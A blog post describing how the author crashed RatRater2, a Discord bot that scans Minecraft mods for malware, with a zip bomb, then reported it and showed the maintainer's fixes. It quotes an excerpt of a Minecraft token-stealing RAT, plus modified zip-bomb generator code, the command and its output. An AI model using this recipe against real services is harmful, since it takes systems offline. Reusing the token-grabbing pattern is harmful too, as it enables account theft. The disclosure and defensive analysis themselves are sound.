+++
title = "Crashing malware detection with zip bombs"
date = 2023-06-29
template = "blog.html"
+++

{{ hr(data_content="prologue") }}
A remote access trojan (RAT) is a form of malware that is designed to give secret  (trojan) and full backdoor access to the victim's computer (remote access). Like many terms, Minecraft players like to apply them to the game with more-or-less accurate in-game definitions (do T flip flops and item entaglement ring a bell?).

Minecraft RATs fall on the less accurate side - most "remote access trojans" in Minecraft simply steal your game token, a 24 hour, unrevocable (thanks, Mojang) session identifier used for connecting to the game, with the principle motivation being stealing valuable items from Hypixel skyblock. As far as I can tell, the only real reason Minecraft players call it a RAT is how fun it is to say the word. For example, a real example of a (not very good) RAT is:
```java
@Mod(modid = JSONrareException.MODID, version = JSONrareException.VERSION)
public class JSONrareException {
    private static String blank = "";
    static Minecraft mc = Minecraft.getMinecraft();
    public static String name = mc.getSession().getProfile().getName();
    public static String uuid = mc.getSession().getProfile().getId().toString();
    public static String token = mc.getSession().getToken();
    public static String nameonpc = System.getProperty("user.name");
    public static String dataGrabbings = "";
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));

    public static String webthingy = "https://discord.com/api/web"+blank+"hooks/"+"";
    public static String screenshotspamhook = "https://discord.com/api/web"+blank+"hooks/"+"";
    // ...
```
This particular malware sample attempts to grab the session token (and other data) and send it through a discord webhook (most rat authors use an intermediary C&C server to prevent fake data from being sent). It comes in the form of a [Forge](https://docs.minecraftforge.net/en/latest/gettingstarted/) mod, disguised by the distributor as a mod that will help you get rich in the game Hypixel skyblock. Of course, the opposite happens, with the "ratter" (as they are colloquially called) stealing all of your in-game wealth.

Many ratters today have moved on to phishing with oauth links (session IDs for Minecraft generated through Microsoft oauth last for 14 days, even if the oauth is revoked! Thanks, Microsoft), or sending password reset links as a "discord verification measure" (known as "botphishing"). However, there still exists a need to detect jar mod-based rats, partly because virustotal can't detect them, [even without obfuscation](https://www.virustotal.com/gui/file-analysis/ZmZkY2I0ZTZlOTM2ZDc5NDYxYjEyYzYxN2Y3ZGFhNzg6MTY4ODA2NzY3Ng==).

{{ hr(data_content="ratrater") }}
Enter RatRater2: an amazing tool developed by [Ktibow](https://github.com/KTibow) used to detect malware disguised as forge mods. Using combinations of rule-based detection, heuristical analysis and decision trees, it is the premier tool used for preliminary analysis, or for less tech-savvy players who want to make sure their mods are safe. Recently, Ktibow has created a [discord application](https://github.com/KTibow/RatRater2Back/tree/main/discord-bot) to make scanning mods even more convenient.

{{ hr(data_content="uh oh") }}
However, there is a major flaw with the bot. Hint: read this part of the JAR file format [specification](https://docs.oracle.com/javase/7/docs/technotes/guides/jar/jar.html#Intro):

> JAR file is a file format based on the popular ZIP file format and is used for aggregating many files into one. A  JAR file is essentially a zip file that contains an optional META-INF directory. A JAR file can be created by the command-line jar tool, or by using the  java.util.jar API in the Java platform. There is no restriction on the name of a JAR file, it can be any legal file name on a particular platform.

Do you see the problem? Maybe the title gave it away. With the original browser-based RatRater2, all the analysis happens locally; there is no opportunity for a DoS attack with a fully client-sided application. Unfortunately, necessarily, a discord bot must do all its processing on the server (in RatRater2's case, with serverless functions). This opens up RatRater2 to a simple attack: simply upload a zip bomb, and the bot should go offline until the worker restarts? 

{{ hr(data_content="a shallow dive into zip bombs") }}
A zip file is simply a container format (similar to .tar without the .gz), but is capable of being extended to compress the files in its container, usually with the DEFLATE algorithm. The zip file must necessarily be smaller than the total decompressed output, allowing for a simple attack: fill a terabyte of data with the same byte, and compress it with a zip tool. The resulting archive should be around 1 GB in size, due to DEFLATE's maximium compression ratio being 1024. Surely decompressing a terabyte of data will crash any free-tier serverless hosting. Alas, I am not sure that discord will be too happy with someone spamming 1 GB file uploads to their server. We need a better solution.

An ingenious solution was presented by David Fifield, taking advantage of the fact that zip is, at its core, a file archiving format meant to pack multiple files into one. An analogy of the zip format (at least the parts that matter to us) is a contiguous collection of "fat pointers" and "data payloads", storing total file length and compressed file data respectively.

Here is an example of this simplified analogy:
```
| length: 1 | data byte | length: 5 | data byte | data byte | data byte | data byte | data byte | length: 1 | data byte |
```
Fifield's brilliant idea is to do something akin to a "buffer overread" - what if we simply increased the range of the length in each "file pointer"?
```
| length: 8 | length: 7 | length: 6 | length: 5 | length: 4 | length: 3 | data byte | data byte | data byte |
```
Of course, if you look closely at the ZIP spec, the above is invalid: file entries (a more accurate name for the "pointers" in the analogy) are not valid data. However, Fifield adds a small bit of data in front of each file entry to make it work in practice. How much data is generated with this method? In the above example, the answer is `3 + 4 + 5 + 6 + 7 + 8`, or:
```
(6/2) * (2 * 3 + (6 - 1)) // formula for arithmetic series'
33
```
If we define `k` to be the amount of data bytes at the end (Fifield calls this a "kernel") and defining `x` to be the amount of files, we get the general form:
```
(x/2) * (x + 2k -1)
(1/2) * (x^2 + (2k - 1)x)
```
Notice that the space used by the zip bomb increases quadratically by the amount of files in the zip bomb (if I were to do one more abuse of nation, I might call this `O(n^2)`). Compared to the space used by a regular zip file, (which always decompresses to 1024 times the compressed size at maximum, which I might call `O(n)`), this method creates extremely large files, transcending DEFLATE's compression limit of 1024 by a lot. In fact, a 42 kilobyte file (an homage to [42.zip](https://www.unforgettable.dk/)) decompresses to "just" 5 gigabytes, but a 10 megabyte file decompresses to [over 200 TB](https://www.bamsoftware.com/hacks/zipbomb/)!

{{ hr(data_content="exploitation(?!)") }}
Of course, this is obviously powerful enough to target RatRater2's cloud infrastructure, if the attack works correctly.

Ktibow claimed that this would not work, when discussing this idea with him. He believes the function isolation means that I would just kill the runner for the worker processing my command specifically. I am unfamiliar with serverless discord bots, so his theory seemed logical. Nevertheless, I decided to test it for myself with an [off-the-shelf zipbomb](https://www.bamsoftware.com/hacks/zipbomb/), renamed to `skyutils.jar` to pass the file format requirements of RatRater2. And it seemed like Ktibow was right, RatRater2 analyzes the file perfectly fine!

![Unsuccessful zipbomb attempt](/images/unsuccessful_zipbomb.png)

After pondering for a while though, it doesn't seem like Ktibow's explanation is fully correct - if the zip bomb is truly contained to my specific command invocation, that should mean the command should fail, but every other command will be processed correctly. I'm forced to look through the code 😔

From [2e81429](https://github.com/KTibow/RatRater2Back/blob/2e8142922f03e5d871350118fa99717d716806b7/discord-bot/src/scan.ts):
```typescript
const tasks = files
    .filter((path) => path.endsWith(".class"))
    .map(async (f) => {
        const contents = await zip.files[f].async("string");
        scan(f, contents, state);
    });
```

RatRater2 uses a library called [jszip](https://stuk.github.io/jszip/) to decompress zip files. Originally, I thought that this library would decompress all the files when `loadAsync` is called on the jar. However, most zip utilities, including this one, simply collect all the "file pointers" in the zip format without decompressing them. Thus, none of the data was actually decompressed until `.async("string")` was called in the above code snippet, which actually decompresses the files. From the code, it is clear that RatRater2 only decompresses files for analysis if they end in `.class` (the extension for compiled java bytecode files). Obviously, Fifield's original zip bombs do not use this file extension for the file name, to save space (in fact, the calculations for total decompressed size earlier assumed that file entry size is negligible). 

{{ hr(data_content="actually touching code") }}
Fortunately, Fifield uploaded his zipbomb code (hilariously, as a [zip file](https://www.bamsoftware.com/hacks/zipbomb/zipbomb-20210121.zip)). The important file here is `zipbomb`, a python script that actually generates the zip bombs. We just need to change every file name to end in `.class` for RatRater2 to unzip them all, so:
```python
FILENAME_ALPHABET = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_ALPHABET[i % len(FILENAME_ALPHABET)])
        i = i // len(FILENAME_ALPHABET) - 1
        if i < 0:
            break
    return bytes(letters)
```
Will turn into this:
```python
FILENAME_ALPHABET = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmopqrstuvwxyz:_-?#*()|'\"{}[]+="
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_ALPHABET[i % len(FILENAME_ALPHABET)])
        i = i // len(FILENAME_ALPHABET) - 1
        if i < 0:
            break
    return bytes(letters + list(b".class"))
```
Notice that `.class` is added to the end of every filename, and I added a bunch of file-safe characters (on GNU/Linux at least) to the alphabet (as Fifield wanted to make sure the zipbombs were compatible with Windows and Mac too). The `Makefile` says this is the command to use to make the 10 MB -> 200 TB zipbomb:
```make
zblg.zip:
    $(ZIPBOMB) --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525 > "$@"
```
So, let's give it a run!
```
❯ python3 zipbomb --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525
Traceback (most recent call last):
  File "/home/Dev380/zipbomb/zipbomb", line 813, in <module>
    main()
  File "/home/Dev380/zipbomb/zipbomb", line 810, in main
    mode(sys.stdout.buffer, num_files, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size, compression_method=compression_method, zip64=zip64, template=template, extra_tag=extra_tag, max_quoted=max_quoted)
  File "/home/Dev380/zipbomb/zipbomb", line 636, in write_zip_quoted_overlap
    header_bytes = files[0].header.serialize(zip64=zip64)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/Dev380/zipbomb/zipbomb", line 396, in serialize
    return struct.pack("<LHHHHHLLLHH",
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
struct.error: 'L' format requires 0 <= number <= 4294967295
```
I still haven't figured out what this error means, but it's fine - I can just cut the `--max-uncompressed-size` in half (100 TB ought to be enough, right?)

And... the command works! Let's see the output of the command with `unzip` (remember, most zip utilities don't crash from zip bombs when they just open zip files and not decompress them)
```
❯ unzip -l skyutils.jar
...
2292789091  1982-10-08 13:37   9x].class
2292789052  1982-10-08 13:37   9x+.class
2292789013  1982-10-08 13:37   9x=.class
2292788974  1982-10-08 13:37   9y0.class
2292788935  1982-10-08 13:37   9y1.class
2292788896  1982-10-08 13:37   9y2.class
2292788857  1982-10-08 13:37   9y3.class
2292788818  1982-10-08 13:37   9y4.class
2292788779  1982-10-08 13:37   9y5.class
2292788740  1982-10-08 13:37   9y6.class
2292788701  1982-10-08 13:37   9y7.class
2292788662  1982-10-08 13:37   9y8.class
2292788623  1982-10-08 13:37   9y9.class
2292788584  1982-10-08 13:37   9yA.class
2292788545  1982-10-08 13:37   9yB.class
2292788506  1982-10-08 13:37   9yC.class
2292788467  1982-10-08 13:37   9yD.class
---------                     -------
150339325883963                     65534 files
```
That's 136 TB! Sure enough, RatRater2's CPU usage skyrockets and crashes from attempting to unzip all that.

![CPU usage high! Credit: Ktibow](/images/ratrater2_cpu.png)

After reporting this to Ktibow, he decided to fix it by adding a file limit to the uplaoded jar archives:
```typescript
if (files.length > 10000) {
    const officialEmbed = genOfficialEmbed();
    await updateMessage({
        content:
          `🚫 ${files.length} classes is too many. ` +
          `RR2 (the bot) would crash if it tried to scan this.`,
        embeds: officialEmbed ? [officialEmbed] : [],
    });
    return;
}
```
Unfortunately, this doesn't work. See the difference between RatRater2's code and Apache's:
```java
/**
* This class wraps a {@link ZipFile} in order to check the
* entries for <a href="https://en.wikipedia.org/wiki/Zip_bomb">zip bombs</a>
* while reading the archive.
* If a {@link ZipInputStream} is directly used, the wrapper
* can be applied via {@link #addThreshold(InputStream)}.
* The alert limits can be globally defined via {@link #setMaxEntrySize(long)}
* and {@link #setMinInflateRatio(double)}.
*/
public class ZipSecureFile extends ZipFile {
   private static POILogger logger = POILogFactory.getLogger(ZipSecureFile.class);
   
   private static double MIN_INFLATE_RATIO = 0.01d;
   private static long MAX_ENTRY_SIZE = 0xFFFFFFFFl;
```
We need to define a maximum *decompressed size*, not a file limit, to be fully safe. The decompresed size can be calculated from the metadata included in each file entry, without decompressing. In fact, by setting the max file limit in the `zipbomb` program to 10000 (exactly RatRater2's limit), we produce a zip bomb with 39 TB of data.

{{ hr(data_content="the end?") }}
Ktibow fixed it in the end:
```typescript
let totalSize = 0;
for (const file of files) {
    // @ts-ignore
    const size = zip.files[file]._data.uncompressedSize;
    totalSize += size < 0 ? size + 2 ** 32 : size;
}
const gb = totalSize / 1024 / 1024 / 1024;
if (gb > 0.5) {
    const officialEmbed = genOfficialEmbed();
    await updateMessage({
        content:
            `🚫 ${gb.toFixed(2)} GB of classes is too big. ` +
            `RR2 (the bot) would crash if it tried to scan this.`,
        embeds: officialEmbed ? [officialEmbed] : [],
    });
    return;
}
```
That's the proper solution! No more DoSing by malicious actors/curious teens :D

If you haven't already, check out [RatRater2](https://ktibow.github.io/RatRater2/) and its [discord bot](https://discord.com/api/oauth2/authorize?client_id=1121073730991439948&permissions=0&scope=applications.commands) if you or your friends play Hypixel skyblock, it's really useful for quick checks if you don't feel like decompiling a mod (although the web version has a built-in decompiler!).
